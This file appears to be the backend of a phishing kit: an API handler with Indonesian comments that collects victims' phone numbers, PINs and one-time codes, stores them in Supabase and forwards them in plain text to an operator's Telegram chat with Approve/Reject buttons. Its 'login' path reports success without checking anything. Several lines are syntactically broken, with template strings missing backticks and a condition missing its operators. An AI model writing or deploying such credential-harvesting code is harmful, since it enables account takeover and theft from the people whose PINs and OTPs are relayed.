import { createClient } from '@supabase/supabase-js';

export default async function handler(req, res) {
  // Hanya terima POST
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { phone, pin, otp, type } = req.body;

  // ================== LOGIN ==================
  if (type === 'login') {
    if (!phone || !pin) {
      return res.status(400).json({ message: 'Phone and PIN required' });
    }

    // Kirim notifikasi ke admin Telegram (tanpa mengganggu respons)
    try {
      const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
      const adminChatId = process.env.ADMIN_CHAT_ID;
      if (telegramToken && adminChatId) {
        await fetch(https://api.telegram.org/bot${telegramToken}/sendMessage, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: adminChatId,
            text: 🔔 *User Login*\n📞 Phone: \${phone}\\n🔢 PIN: \${pin}\``,
            parse_mode: 'Markdown'
          })
        });
      }
    } catch (err) {
      // Gagal kirim notifikasi, tapi tetap beri respons sukses ke frontend
      console.error('Gagal kirim notifikasi login:', err);
    }

    // Respons sukses ke frontend
    return res.status(200).json({ success: true });
  }

  // ================== SUBMIT OTP ==================
  if (!phone  !pin  !otp) {
    return res.status(400).json({ message: 'Phone, PIN, and OTP required' });
  }

  // Validasi environment variable Supabase
  const supabaseUrl = process.env.SUPABASE_URL;
  const supabaseKey = process.env.SUPABASE_ANON_KEY;
  if (!supabaseUrl || !supabaseKey) {
    console.error('Missing Supabase environment variables');
    return res.status(500).json({ message: 'Server configuration error' });
  }

  const supabase = createClient(supabaseUrl, supabaseKey);

  try {
    // Simpan ke database
    const { data, error } = await supabase
      .from('verifikasi_requests')
      .insert([{ phone, pin, otp, status: 'pending' }])
      .select();
    if (error) throw error;
    if (!data || data.length === 0) throw new Error('Insert failed');

    // Kirim notifikasi ke admin Telegram dengan inline keyboard
    const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
    const adminChatId = process.env.ADMIN_CHAT_ID;
    if (telegramToken && adminChatId) {
      const inlineKeyboard = {
        inline_keyboard: [
          [
            { text: "✅ Approve", callback_data: approve|${phone}|${pin}|${otp} },
            { text: "❌ Reject", callback_data: reject|${phone}|${pin}|${otp} }
          ]
        ]
      };

      await fetch(https://api.telegram.org/bot${telegramToken}/sendMessage, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: adminChatId,
          text: 🔔 *Permintaan Verifikasi*\n📞 Phone: \${phone}\\n🔢 PIN: \${pin}\\n🔑 OTP: \${otp}\``,
          parse_mode: 'Markdown',
          reply_markup: inlineKeyboard
        })
      });
    }

    res.status(201).json({ success: true, requestId: data[0].id });
  } catch (err) {
    console.error('Error:', err);
    res.status(500).json({ message: 'Gagal menyimpan data' });
  }
}
